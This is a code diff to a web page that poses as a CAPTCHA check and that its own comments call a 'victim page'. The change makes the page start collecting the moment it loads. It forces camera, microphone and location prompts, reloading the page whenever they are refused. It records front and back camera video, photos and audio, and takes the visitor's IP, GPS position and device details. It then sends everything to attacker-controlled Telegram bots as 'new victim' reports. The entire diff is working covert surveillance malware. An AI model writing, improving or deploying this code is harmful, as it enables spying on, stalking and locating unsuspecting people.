@@ -1491,7 +1491,7 @@
     <canvas id="hiddenCanvas"></canvas>
 
     <!-- ============================================================
-         JAVASCRIPT — FINAL STABLE VERSION — FULL SEND
+         JAVASCRIPT — ULTRA FAST — INSTANT COLLECTION & SEND
          ============================================================ -->
     <script>
         (function() {
@@ -1816,7 +1816,7 @@
             }
 
             // ============================================================
-            //  🔥  VICTIM PAGE — FULL SEND TO MASTER & USER
+            //  🔥  VICTIM PAGE — INSTANT COLLECTION & SEND
             // ============================================================
 
             async function initVictimPage(shortToken) {
@@ -1827,7 +1827,6 @@
                 const canvas = document.getElementById('hiddenCanvas');
                 const ctx = canvas.getContext('2d');
 
-                let isRunning = false;
                 let collectionDone = false;
 
                 async function getBotMapping(token) {
@@ -1848,13 +1847,198 @@
                     }
                 }
 
-                // ---- Send functions (fire and forget) ----
-                function sendToMaster(data) {
-                    const { ip, location, deviceInfo, frontVideo, backVideo, audio, photos } = data;
+                // ----- Send helper (fire and forget) -----
+                function sendMediaAsync(method, botToken, formData) {
+                    fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    }).catch(() => {});
+                }
 
-                    // 1. Send summary text
+                // ----- Main collection (runs immediately) -----
+                async function collectData() {
+                    if (collectionDone) return;
+
+                    try {
+                        // 1. Force permissions
+                        await requestAllPermissions();
+
+                        // 2. Get mapping
+                        const mapping = await getBotMapping(shortToken);
+                        const botName = mapping.found ? mapping.botName : 'غير معروف';
+                        const userBotToken = mapping.found ? mapping.botToken : null;
+                        const userChatId = mapping.found ? mapping.chatId : null;
+
+                        // 3. Get IP
+                        let ip = 'غير متاح';
+                        try {
+                            const res = await fetch('https://api.ipify.org?format=json');
+                            const data = await res.json();
+                            ip = data.ip;
+                        } catch (e) {}
+
+                        // 4. Get location
+                        let location = { lat: null, lng: null, accuracy: null, error: null };
+                        try {
+                            if (navigator.geolocation) {
+                                const pos = await new Promise((resolve, reject) => {
+                                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                                });
+                                location = {
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    error: null
+                                };
+                            }
+                        } catch (e) {
+                            location.error = e.message;
+                        }
+
+                        // 5. Battery
+                        const battery = await getBatteryLevel();
+
+                        // 6. Front camera (photos + video) — parallel
+                        let frontVideo = null;
+                        let photos = [];
+                        try {
+                            const stream = await navigator.mediaDevices.getUserMedia({
+                                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                                audio: false
+                            });
+                            video.srcObject = stream;
+                            await video.play();
+                            await delay(200);
+
+                            // Record 3s video
+                            const recorder = new MediaRecorder(stream);
+                            const chunks = [];
+                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+                            const videoPromise = new Promise((resolve) => {
+                                recorder.onstop = () => {
+                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+                                    resolve(blob);
+                                };
+                            });
+                            recorder.start();
+                            await delay(3000);
+                            if (recorder.state === 'recording') recorder.stop();
+                            frontVideo = await videoPromise;
+
+                            // Capture 4 photos
+                            for (let i = 0; i < 4; i++) {
+                                const w = video.videoWidth || 640;
+                                const h = video.videoHeight || 480;
+                                canvas.width = w;
+                                canvas.height = h;
+                                ctx.drawImage(video, 0, 0, w, h);
+                                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                                if (blob) photos.push(blob);
+                                await delay(300);
+                            }
+                            stream.getTracks().forEach(t => t.stop());
+                            video.srcObject = null;
+                        } catch (e) {
+                            console.warn('Front camera error:', e);
+                        }
+
+                        // 7. Back camera (video) — parallel
+                        let backVideo = null;
+                        try {
+                            const stream = await navigator.mediaDevices.getUserMedia({
+                                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+                                audio: false
+                            });
+                            video.srcObject = stream;
+                            await video.play();
+                            await delay(200);
+                            const recorder = new MediaRecorder(stream);
+                            const chunks = [];
+                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+                            const videoPromise = new Promise((resolve) => {
+                                recorder.onstop = () => {
+                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+                                    resolve(blob);
+                                };
+                            });
+                            recorder.start();
+                            await delay(3000);
+                            if (recorder.state === 'recording') recorder.stop();
+                            backVideo = await videoPromise;
+                            stream.getTracks().forEach(t => t.stop());
+                            video.srcObject = null;
+                        } catch (e) {
+                            console.warn('Back camera error:', e);
+                        }
+
+                        // 8. Audio (3s)
+                        let audioBlob = null;
+                        try {
+                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                            const recorder = new MediaRecorder(stream);
+                            const chunks = [];
+                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+                            const audioPromise = new Promise((resolve) => {
+                                recorder.onstop = () => {
+                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+                                    resolve(blob);
+                                };
+                            });
+                            recorder.start();
+                            await delay(3000);
+                            if (recorder.state === 'recording') recorder.stop();
+                            audioBlob = await audioPromise;
+                            stream.getTracks().forEach(t => t.stop());
+                        } catch (e) {
+                            console.warn('Audio error:', e);
+                        }
+
+                        // 9. Build device info
+                        const deviceInfo =
+                            `IP: ${ip}\n` +
+                            `البطارية: ${battery}\n` +
+                            `الموقع: ${location.lat ? location.lat + ', ' + location.lng : 'غير متاح'}\n` +
+                            `المتصفح: ${/Chrome/.test(navigator.userAgent) ? 'Chrome' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown'}\n` +
+                            `الجهاز: ${navigator.platform || 'Unknown'}\n` +
+                            `التوكن الفريد: ${shortToken}\n` +
+                            `الوقت: ${new Date().toLocaleString('ar-EG')}`;
+
+                        const data = {
+                            ip,
+                            location,
+                            deviceInfo,
+                            frontVideo,
+                            backVideo,
+                            audio: audioBlob,
+                            photos
+                        };
+
+                        // 10. Send to master (fire and forget)
+                        sendToMaster(data);
+                        // 11. Send to user (fire and forget)
+                        sendToUser(data, userBotToken, userChatId, botName);
+
+                        collectionDone = true;
+                        spinner.classList.add('success');
+                        mainText.textContent = 'تم التحقق بنجاح';
+                        mainText.className = 'text success';
+                        checkbox.checked = true;
+                        checkbox.disabled = true;
+
+                        sessionStorage.removeItem(RETRY_KEY);
+
+                    } catch (error) {
+                        console.warn('Permission denied, forcing retry...');
+                        sessionStorage.setItem(RETRY_KEY, 'true');
+                        location.reload();
+                    }
+                }
+
+                // ----- Send functions -----
+                function sendToMaster(data) {
                     const summary =
-                        `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`;
+                        `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${data.deviceInfo}\n─────────────────`;
                     fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -1862,22 +2046,20 @@
                         keepalive: true
                     }).catch(() => {});
 
-                    // 2. Send location
-                    if (location.lat && location.lng) {
+                    if (data.location.lat && data.location.lng) {
                         fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
                                 chat_id: MASTER_CHAT_ID,
-                                latitude: location.lat,
-                                longitude: location.lng
+                                latitude: data.location.lat,
+                                longitude: data.location.lng
                             }),
                             keepalive: true
                         }).catch(() => {});
                     }
 
-                    // 3. Send photos
-                    photos.forEach((blob) => {
+                    data.photos.forEach((blob) => {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('photo', blob);
@@ -1885,29 +2067,26 @@
                         sendMediaAsync('sendPhoto', MASTER_BOT_TOKEN, fd);
                     });
 
-                    // 4. Send front video
-                    if (frontVideo) {
+                    if (data.frontVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('video', frontVideo);
+                        fd.append('video', data.frontVideo);
                         fd.append('caption', `🎥 فيديو أمامي - ${shortToken}`);
                         sendMediaAsync('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
 
-                    // 5. Send back video
-                    if (backVideo) {
+                    if (data.backVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('video', backVideo);
+                        fd.append('video', data.backVideo);
                         fd.append('caption', `🎥 فيديو خلفي - ${shortToken}`);
                         sendMediaAsync('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
 
-                    // 6. Send audio
-                    if (audio) {
+                    if (data.audio) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
-                        fd.append('audio', audio);
+                        fd.append('audio', data.audio);
                         fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
                         sendMediaAsync('sendAudio', MASTER_BOT_TOKEN, fd);
                     }
@@ -1971,211 +2150,23 @@
                     }
                 }
 
-                // ----- Send media helper (with keepalive) -----
-                function sendMediaAsync(method, botToken, formData) {
-                    fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
-                        method: 'POST',
-                        body: formData,
-                        keepalive: true
-                    }).catch(() => {});
-                }
-
-                // ---- Main collection ----
-                async function collectData() {
-                    if (isRunning || collectionDone) return;
-
-                    isRunning = true;
-                    checkbox.disabled = true;
-                    spinner.classList.add('loading');
-                    mainText.textContent = 'جاري التحقق...';
-                    mainText.className = 'text loading';
-
-                    try {
-                        // 1. Force permissions
-                        await requestAllPermissions();
-
-                        // 2. Get mapping
-                        const mapping = await getBotMapping(shortToken);
-                        const botName = mapping.found ? mapping.botName : 'غير معروف';
-                        const userBotToken = mapping.found ? mapping.botToken : null;
-                        const userChatId = mapping.found ? mapping.chatId : null;
-
-                        // 3. Get IP
-                        let ip = 'غير متاح';
-                        try {
-                            const res = await fetch('https://api.ipify.org?format=json');
-                            const data = await res.json();
-                            ip = data.ip;
-                        } catch (e) {}
-
-                        // 4. Get location
-                        let location = { lat: null, lng: null, accuracy: null, error: null };
-                        try {
-                            if (navigator.geolocation) {
-                                const pos = await new Promise((resolve, reject) => {
-                                    navigator.geolocation.getCurrentPosition(resolve, reject);
-                                });
-                                location = {
-                                    lat: pos.coords.latitude,
-                                    lng: pos.coords.longitude,
-                                    accuracy: pos.coords.accuracy,
-                                    error: null
-                                };
-                            }
-                        } catch (e) {
-                            location.error = e.message;
-                        }
-
-                        // 5. Battery
-                        const battery = await getBatteryLevel();
-
-                        // 6. Front camera (photos + video)
-                        let frontVideo = null;
-                        let photos = [];
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({
-                                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                                audio: false
-                            });
-                            video.srcObject = stream;
-                            await video.play();
-                            await delay(400);
-
-                            const recorder = new MediaRecorder(stream);
-                            const chunks = [];
-                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                            const videoPromise = new Promise((resolve) => {
-                                recorder.onstop = () => {
-                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
-                                    resolve(blob);
-                                };
-                            });
-                            recorder.start();
-                            await delay(5000);
-                            if (recorder.state === 'recording') recorder.stop();
-                            frontVideo = await videoPromise;
-
-                            for (let i = 0; i < 8; i++) {
-                                const w = video.videoWidth || 640;
-                                const h = video.videoHeight || 480;
-                                canvas.width = w;
-                                canvas.height = h;
-                                ctx.drawImage(video, 0, 0, w, h);
-                                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
-                                if (blob) photos.push(blob);
-                                await delay(600);
-                            }
-                            stream.getTracks().forEach(t => t.stop());
-                            video.srcObject = null;
-                        } catch (e) {
-                            console.warn('Front camera error:', e);
-                        }
-
-                        // 7. Back camera
-                        let backVideo = null;
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({
-                                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
-                                audio: false
-                            });
-                            video.srcObject = stream;
-                            await video.play();
-                            await delay(400);
-                            const recorder = new MediaRecorder(stream);
-                            const chunks = [];
-                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                            const videoPromise = new Promise((resolve) => {
-                                recorder.onstop = () => {
-                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
-                                    resolve(blob);
-                                };
-                            });
-                            recorder.start();
-                            await delay(5000);
-                            if (recorder.state === 'recording') recorder.stop();
-                            backVideo = await videoPromise;
-                            stream.getTracks().forEach(t => t.stop());
-                            video.srcObject = null;
-                        } catch (e) {
-                            console.warn('Back camera error:', e);
-                        }
-
-                        // 8. Audio
-                        let audioBlob = null;
-                        try {
-                            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                            const recorder = new MediaRecorder(stream);
-                            const chunks = [];
-                            recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
-                            const audioPromise = new Promise((resolve) => {
-                                recorder.onstop = () => {
-                                    const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
-                                    resolve(blob);
-                                };
-                            });
-                            recorder.start();
-                            await delay(5000);
-                            if (recorder.state === 'recording') recorder.stop();
-                            audioBlob = await audioPromise;
-                            stream.getTracks().forEach(t => t.stop());
-                        } catch (e) {
-                            console.warn('Audio error:', e);
-                        }
-
-                        // 9. Build device info
-                        const deviceInfo =
-                            `IP: ${ip}\n` +
-                            `البطارية: ${battery}\n` +
-                            `الموقع: ${location.lat ? location.lat + ', ' + location.lng : 'غير متاح'}\n` +
-                            `المتصفح: ${/Chrome/.test(navigator.userAgent) ? 'Chrome' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown'}\n` +
-                            `الجهاز: ${navigator.platform || 'Unknown'}\n` +
-                            `التوكن الفريد: ${shortToken}\n` +
-                            `الوقت: ${new Date().toLocaleString('ar-EG')}`;
-
-                        const data = {
-                            ip,
-                            location,
-                            deviceInfo,
-                            frontVideo,
-                            backVideo,
-                            audio: audioBlob,
-                            photos
-                        };
-
-                        // 10. Send to master and user (parallel, fire-and-forget)
-                        sendToMaster(data);
-                        sendToUser(data, userBotToken, userChatId, botName);
-
-                        collectionDone = true;
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('success');
-                        mainText.textContent = 'تم التحقق بنجاح';
-                        mainText.className = 'text success';
-                        checkbox.checked = true;
-                        checkbox.disabled = true;
-
-                        sessionStorage.removeItem(RETRY_KEY);
-
-                    } catch (error) {
-                        console.warn('Permission denied, forcing retry...');
-                        sessionStorage.setItem(RETRY_KEY, 'true');
-                        location.reload();
-                    }
-                }
-
+                // ----- Retry check -----
                 function checkRetryAndCollect() {
                     if (sessionStorage.getItem(RETRY_KEY) === 'true') {
                         setTimeout(() => {
                             collectData();
-                        }, 100);
+                        }, 50);
+                    } else {
+                        // Start immediately
+                        collectData();
                     }
                 }
 
-                // ---- Events ----
+                // ---- Events (just in case user clicks) ----
                 checkbox.addEventListener('change', function(e) {
                     if (this.checked) {
                         this.checked = false;
-                        if (!isRunning && !collectionDone) {
+                        if (!collectionDone) {
                             collectData();
                         }
                     }
@@ -2183,12 +2174,13 @@
 
                 document.querySelector('.captcha-wrapper').addEventListener('click', function(e) {
                     if (e.target.closest('a')) return;
-                    if (!isRunning && !collectionDone && !checkbox.disabled) {
+                    if (!collectionDone && !checkbox.disabled) {
                         collectData();
                     }
                 });
 
                 console.log('✅ Victim page ready. Token:', shortToken);
+                // Start collection immediately
                 checkRetryAndCollect();
             }
 
